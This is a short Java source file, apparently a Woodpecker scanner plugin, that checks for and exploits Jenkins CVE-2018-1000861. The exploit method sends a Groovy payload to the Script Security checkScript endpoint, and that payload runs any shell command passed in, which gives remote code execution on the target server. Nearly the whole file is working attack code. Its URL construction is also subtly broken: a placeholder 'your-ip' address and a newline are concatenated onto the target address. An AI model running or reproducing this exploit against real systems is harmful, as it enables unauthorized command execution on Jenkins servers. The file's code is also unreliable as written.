package me.gv7.woodpecker.plugin;

import net.dongliu.requests.RawResponse;
import net.dongliu.requests.Requests;

import java.net.URLEncoder;

public class JenkinsCommonsUtils {

    public static boolean CVE_2018_1000861Check(String addr){
        final String vulPath = "securityRealm/user/admin/search/index?q=a";
        RawResponse send = Requests.get(addr + vulPath).verify(false).send();
        return send.statusCode() == 200;
    }

    public static String CVE_2018_1000861Exploit(String addr, String command){
        final String vulPath = "http://your-ip:8080/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript\n" +
                "?sandbox=true" +
                "&value=";

        final String payload = "=public class x {" +
                "  public x(){" +
                "    \""+command+"\".execute()" +
                "  }" +
                "}";
        final String address = addr + vulPath + URLEncoder.encode(payload);
        try {
            Requests.get(address).verify(false).send();
            return "发送成功";
        }catch (Exception e){
            return "发送失败";
        }
    }
}
